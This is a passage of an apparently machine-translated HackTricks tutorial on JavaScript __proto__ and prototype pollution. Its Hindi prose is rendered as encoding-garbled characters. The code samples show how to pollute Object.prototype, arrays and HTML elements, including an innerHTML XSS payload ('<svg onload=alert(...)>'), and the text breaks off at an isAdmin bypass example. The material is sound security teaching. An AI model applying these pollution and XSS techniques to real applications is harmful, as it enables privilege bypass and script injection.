# NodeJS - \_\_proto\_\_ рдФрд░ prototype Pollution

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## JavaScript рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ <a href="#053a" id="053a"></a>

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ JavaScript рдореЗрдВ `Object` рдХреЛ рд╕рдордЭрдирд╛ рд╣реЛрдЧрд╛ред рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рд┐рд░реНрдл рдХреБрдВрдЬреА рдФрд░ рдорд╛рди рдХреЗ рд╕рдВрдЧреНрд░рд╣ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ рдЙрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

![](<../../../.gitbook/assets/image (389) (1).png>)

JavaScript рдореЗрдВ, `Object` рдПрдХ рдореВрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рд╣реИ, рдирдП рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯред `Object.create` рдХреЛ `null` рдкрд╛рд╕ рдХрд░рдХреЗ рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдирдП рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рднреА рдПрдХ рдкреНрд░рдХрд╛рд░ рд╣реЛрдЧрд╛ рдЬреЛ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╕рднреА рдореВрд▓ рдЧреБрдгреЛрдВ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИред
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

рдкрд╣рд▓реЗ рд╣рдордиреЗ рд╕реАрдЦрд╛ рдерд╛ рдХрд┐ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреБрдВрдЬреА рдФрд░ рдорд╛рдиреЛрдВ рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдордЭрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ `null` рдСрдмреНрдЬреЗрдХреНрдЯ рдмрд╕ рдПрдХ рдЦрд╛рд▓реА рд╢рдмреНрджрдХреЛрд╢ рд╣реИ: `{}`

## рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлрдВрдХреНрд╢рди / рдХреНрд▓рд╛рд╕ <a href="#55dd" id="55dd"></a>

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, рдХреНрд▓рд╛рд╕ рдФрд░ рдлрдВрдХреНрд╢рди рдХреЗ рдЕрд╡рдзрд╛рд░рдгрд╛рдПрдВ рдХрд╛рдлреА рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрддреА рд╣реИрдВ (рдлрдВрдХреНрд╢рди рдЦреБрдж рдХреНрд▓рд╛рд╕ рдХреЗ рд▓рд┐рдП рдХрдиреНрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрд╡рд░реВрдк рдореЗрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ "рдХреНрд▓рд╛рд╕" рдХреА рдХреЛрдИ рдЕрд╡рдзрд╛рд░рдгрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ)ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреЛ рджреЗрдЦреЗрдВ:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк <a href="#3843" id="3843"></a>

рдПрдХ рдмрд╛рдд рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдмрджрд▓рд╛ / рд╕рдВрд╢реЛрдзрд┐рдд / рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдбрд╛рдпрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

![](<../../../.gitbook/assets/image (363).png>)

рдХрдХреНрд╖рд╛рдУрдВ рдХреА рднреА рд╕рдВрд╢реЛрдзрди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ (рдЬреИрд╕реЗ `toString` рдпрд╛ `valueOf` рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рдорд▓реЛрдВ рдореЗрдВ):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## рд╡рд┐рд░рд╛рд╕рдд

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ, рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрдХреНрд╖рд╛рдУрдВ рд╕реЗ рдЧреБрдгреЛрдВ / рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред рдХрдХреНрд╖рд╛рдПрдВ рдПрдХ рдЕрдиреНрдп рдХрдХреНрд╖рд╛ рдХреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЧреБрдгреЛрдВ / рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рдпрд╛ рдЦрд╛рд▓реА рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдЬреЛрдбрд╝рдХрд░ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ, рдпрджрд┐ рдЖрдк рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдПрдХ рдЧреБрдг рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐ рдПрдХ рд╕реЗрдЯ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ myPersonObj), рддреЛ рдЬрд┐рди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╣реИ, рд╡реЗ рдирдП рдЧреБрдг рдХреЛ рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡рд╣ рдЧреБрдг рдЫрд╛рдкрд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рддрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмреБрд▓рд╛рдпрд╛ рди рдЬрд╛рдПред

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ рдкреНрд░рджреВрд╖рдг <a href="#0d0a" id="0d0a"></a>

рдЖрдкрдиреЗ рдкрд╣рд▓реЗ рд╣реА рд╕реАрдЦ рд▓рд┐рдпрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рд┐рд░реНрдл рдХреБрдВрдЬреА рдФрд░ рдорд╛рди рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реИ** рдФрд░ **рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ Object рдкреНрд░рдХрд╛рд░ рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдЖрддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк Object рдкреНрд░рдХрд╛рд░ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ, рддреЛ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░рджреВрд╖рд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛!

рдпрд╣ рдХрд╛рдлреА рд╕рд░рд▓ рд╣реИ, рдЖрдкрдХреЛ рдмрд╕ рдХреБрдЫ рдЧреБрдгреЛрдВ (рдХреБрдВрдЬреА-рдорд╛рди рдЬреЛрдбрд╝реЛрдВ) рдХреЛ рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ Object рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдЖрддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ Object рдпреЛрдЬрдирд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИред
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рд╕рдВрд░рдЪрдирд╛ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
рддреЛ, рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛, рдЕрдЧрд░ рдЕрдм рдПрдХ рдЧреБрдг (property) рдХреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реНрдХреАрдо (Object scheme) рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдирдпреЗ рдЧреБрдг (property) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
рдЕрдм рд╣рд░ рдЬреЗрдПрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдирдП рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реЛрдВрдЧреА: рдлрдВрдХреНрд╢рди `printHello` рдФрд░ рдирдИ рд╕реНрдерд┐рд░ `globalconstant`

## рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг

рдпрд╣ рддрдХрдиреАрдХ рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдкреНрд░рднрд╛рд╡реА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЬреЗрдПрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдпреЛрдЬрдирд╛ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд▓реЗрдХрд┐рди рдРрд╕реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ **рдХреАрд╡рд░реНрдб `__proto__` рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИ, рдпрд╣ рддрдХрдиреАрдХ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИ**ред

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдлрдВрдХреНрд╢рди рдХреА рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдлрдВрдХреНрд╢рди рдХреА `prototype` рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдпрд╣рд╛рдВ рдЬреЛ рднреА рдирдИ рдкреНрд░реЙрдкрд░реНрдЯреА рдЖрдк рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рд╡рд╣ рд╣рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдЧреНрд░рд╣реАрдд рд╣реЛрдЧреА:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдХреЗрд╡рд▓ `person` рдХрдХреНрд╖рд╛ рд╕реЗ рдмрдирд╛рдП рдЧрдП **рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕** рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЕрдм рд╣рд░ рдПрдХ рдореЗрдВ **`sayHello` рдФрд░ `newConstant`** рдЧреБрдгреЛрдВ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**JS рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреЙрдЗрдЬрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП prototype pollution рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ 2 рддрд░реАрдХреЗ рд╣реИрдВред**

рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛ **Object** рдХреА рдкреНрд░реЙрдкрд░реНрдЯреА prototype рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдирд╛ (рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдХрд╣рд╛ рдЧрдпрд╛ рд╣реИ, рд╣рд░ JS рдСрдмреНрдЬреЗрдХреНрдЯ рдЗрд╕рд╕реЗ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИ):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
рдпрджрд┐ рдЖрдк рдРрд╕рд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬреЗрдХреНрдЯ `sayBye` рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдЧрд╛ред

рджреВрд╕рд░рд╛ рддрд░реАрдХрд╛ рдПрдХ рдбрд┐рдХреНрд╢рдирд░реА рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ constructor рдХреЗ prototype рдХреЛ рдкреЙрдЗрдЬрди рдХрд░рдирд╛ рд╣реИ, рдЬреИрд╕реЗ рдирд┐рдореНрди рдЙрджрд╛рд╣рд░рдг рдореЗрдВ:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
рдЙрд╕ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, **рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬреЗрдХреНрдЯ `sayHey` рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдЧрд╛**ред

## рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдирд╛

### рдХрдХреНрд╖рд╛ рд╕реЗ Object.prototype рддрдХ

рдПрдХ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдк **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдкрдХреЛ **`Object.prototype` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### рдПрд░реЗ рддрддреНрд╡ рдкреНрд░рджреВрд╖рдг

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬреЗрдПрд╕ рдореЗрдВ рдЖрдк рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдПрд░реЗ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ рдЖрдк рдПрд░реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдПрд░реЗ рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рднреА **рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рдЗрдВрдбреЗрдХреНрд╕ рдХреЗ рджреНрд╡рд╛рд░рд╛** рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдорд╛рдиреЛрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдРрд╕реЗ рдЗрдВрдбреЗрдХреНрд╕ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рдХрд┐рд╕реА рди рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд▓рд┐рдЦрд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛ рд╣реИ)ред
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html рддрддреНрд╡реЛрдВ рдХрд╛ рдкреНрд░рджреВрд╖рдг

JS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ HTML рддрддреНрд╡ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╕рдордп, рдЗрд╕реЗ **`innerHTML`** рдЧреБрдгрд╛рдВрдХ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░рдХреЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ **рд╡рд┐рдЪрд┐рддреНрд░ HTML рдХреЛрдб рд▓рд┐рдЦреЗрдВред** [рдЗрд╕ рд▓реЗрдЦ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдФрд░ рдЙрджрд╛рд╣рд░рдг](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ред

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## рдЙрджрд╛рд╣рд░рдг

### рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рддреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╣рд╛рдБ рд╣реИ? рдпрд╣ рдЙрд╕ рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдмрдЧ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `Object.prototype` рдХреА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдирд╛рддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рд╣рд░ рд╕рд╛рдзрд╛рд░рдг рд╡рд╕реНрддреБ `Object.prototype` рд╕реЗ рдЕрдкрдиреА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЛ рдЕрдзрд┐рд░реЛрд╣рд┐рдд рдХрд░рддреА рд╣реИ, рд╣рдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрдо рджрд┐рдЦрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛрддрд╛ рд╣реИ:
```javascript
if (user.isAdmin) {   // do something important!}
```
